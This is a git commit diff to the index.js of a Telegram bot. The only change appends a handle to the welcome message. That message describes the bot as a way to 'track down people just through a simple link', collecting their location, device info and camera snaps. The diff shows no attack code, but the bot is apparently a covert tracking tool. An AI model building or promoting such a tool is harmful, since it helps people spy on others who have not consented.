28d7c360207c46e2b6e779e638cf413fe7e172c0
Yadav210012 <126337558+Yadav210012@users.noreply.github.com>
2023-03-23 10:08:10 +0530

    Update index.js

--- index.js
+++ index.js
@@ -71,7 +71,7 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info @Unknown_Reason.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
